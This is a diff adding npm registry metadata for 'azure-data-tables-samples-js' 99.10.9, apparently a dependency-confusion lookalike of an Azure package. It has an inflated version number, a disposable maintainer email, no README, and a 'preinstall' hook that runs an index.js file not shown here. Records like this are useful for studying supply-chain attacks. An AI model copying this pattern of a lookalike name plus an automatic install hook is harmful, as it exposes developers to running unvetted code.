@@ -1,0 +1,62 @@
+{
+    "_id": "azure-data-tables-samples-js",
+    "name": "azure-data-tables-samples-js",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-data-tables-samples-js",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-data-tables-samples-js@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-i5eEEaF6MIzOTpuJY4do9DZiKU/XIcQ80nY7tX6M4g6NaRd4wDoedQ5IybfMG+pl4BFI/Wwo4qHjhIQpd6j1+Q==",
+                "shasum": "cb63f2714c1cca5f47ce66db7f00f26f3ceaf974",
+                "tarball": "https://registry.npmjs.org/azure-data-tables-samples-js/-/azure-data-tables-samples-js-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5080,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOovMACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqNzQ//SwqbzyowtB2iKYLqWObLTc1ljnjWhVJv553XyShO7ZMIhnbA\r\nD3xT66G45BuKcPD8V0Yep8fRTIQh4kjRdyE5d7ervycdTxuvBDinC2W8aigA\r\nrnY0P0RJufqPT3F0d9t4+jt8EN1CFFq5vabdVA6VB22964ANK+ycC6S10Gd9\r\n9YTP+1dqPfDn+PtppiUNNZh9Uc+8SH80S/6HeunIuwaSnsioPpaZQ0Gz+5rA\r\nxNag0U+cbNJHk++wzlea50jh8J9HYFRckRFcsF+AAvuPfq5lzpqdn4f+1Stn\r\nmOdZ9gH7IFygat4xRK6a2QHU+KtnD7SHYFROcU6SsCAHtVWU7JNh97xk9uSn\r\nXDEJz3umHZy1hIUceWXw26gyArZa/KsaKGT5sLrmDfMWt/V+jiuYahbNXZgu\r\nPdWtBMzeYeZqjAWgyuoGhEbeIWP06X+tmFJ8+40UNP0NubuOKrF5CVcieG9A\r\nEQU71z4MLHY5M3CtS+0UXxvuCVzC2bykaMsZsKZpOH0/bPoJpmfZrhxJ4LOd\r\nnaz1Nr2cugwFa0Ncpp8ho9F2zbo9XZAWcOM8CEqBks2jwiIdy9m9dyJadvOo\r\nvebSaNI0tCcGbn9Gi98DmjOlEE3NIJfjITGeBkHzw1jikD65Dn7jwLFtiPBb\r\n2zPGf5COIdhdrZUOwS7SI+4jf/PlfuvPmAg=\r\n=eHsu\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "ta4yjxi6",
+                "email": "ta4yjxi6@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "ta4yjxi6",
+                    "email": "ta4yjxi6@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-data-tables-samples-js_99.10.9_1648004043979_0.15517535929934967"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T02:54:03.977Z",
+        "99.10.9": "2022-03-23T02:54:04.145Z",
+        "modified": "2022-03-23T02:54:04.268Z"
+    },
+    "maintainers": [
+        {
+            "name": "ta4yjxi6",
+            "email": "ta4yjxi6@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
